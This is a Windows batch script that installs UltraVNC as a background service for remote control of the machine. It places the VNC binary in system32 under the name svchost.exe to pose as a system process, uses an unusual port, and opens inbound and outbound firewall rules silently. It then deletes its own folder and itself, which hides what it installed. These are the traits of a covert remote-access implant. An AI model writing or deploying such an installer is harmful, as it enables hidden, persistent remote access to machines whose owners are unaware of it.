::
:: @paxlo
::

@echo off &setlocal
setlocal EnableDelayedExpansion
setlocal enableextensions
call :IsAdmin

set vncdir=%systemroot%\system32\vnc
set vncfile=!vncdir!\svchost.exe
set vncport=65033
set vncservicename=uvnc_service


cls
echo|set /p="Searching for files............."
timeout /t 1 /nobreak > NUL
if exist %vncfile% (
	timeout /t 1 /nobreak > NUL
	echo [FOUND]
) else (
	echo [NOT FOUND]
	echo|set /p="Searching for the service......."
	timeout /t 1 /nobreak > NUL
	sc query %vncservicename% >NUL
	if errorlevel 1060 (
		echo [NOT FOUND]
		goto install
	) else (
	    for /f tokens^=1-3^ delims^=^" %%a in ('reg query HKLM\System\CurrentControlSet\Services\uvnc_service /v ImagePath') do set vncfile=%%b 
		for %%i in (!vncfile!) do ( set vncdir=%%~di%%~pi)
		echo [FOUND IN !vncfile!]
	)
)

:uninstall
echo|set /p="Uninstalling...................."
start /w !vncfile! -uninstall && echo [DONE]
rmdir /s /q !vncdir! 2>NUL
:install
netsh advfirewall firewall delete rule name=all program="!vncfile!" >nul 2>&1
netsh advfirewall firewall delete rule name=all protocol=tcp localport="%vncport%" >nul 2>&1
echo %processor_architecture% | findstr AMD64>NUL && set arch=x64 || set arch=x86
mkdir !vncdir! 2>NUL
echo|set /p="Copying files..................."
xcopy /e /q /h /r /y  %arch% !vncdir! >nul 2>&1
timeout /t 1 /nobreak > NUL
echo [DONE]

:: Haven't done this section yet. Installs Virtual Display Driver. Couldn't be installed properly because of "OS is not supported". WTF?
::for /f "tokens=4-5 delims=. " %%i in ('ver') do set winversion=%%i.%%j
::if "%winversion%" == "10.0" !vncfile! -installdriver

echo|set /p="Service installation............"
start /w !vncfile! -install
netsh advfirewall firewall add rule name="Virtual Network Computing" dir=in action=allow program="!vncdir!\svchost.exe" enable=yes >nul 2>&1
netsh advfirewall firewall add rule name="Virtual Network Computing" dir=out action=allow program="!vncdir!\svchost.exe" enable=yes >nul 2>&1
netsh advfirewall firewall add rule name="Virtual Network Computing" dir=in action=allow protocol=tcp localport="%vncport%" enable=yes >nul 2>&1
echo [DONE]
timeout /t 3 /nobreak > NUL
rmdir /s /q %CD% 2>NUL
(goto) 2>nul & del /f /q "%~f0"
exit

:IsAdmin
reg query "HKU\S-1-5-19\Environment"
if not %ERRORLEVEL% equ 0 (
 cls & echo You have no administrator privileges!
 pause>nul & exit
)
cls
goto:eof

::
:: @paxlo
::
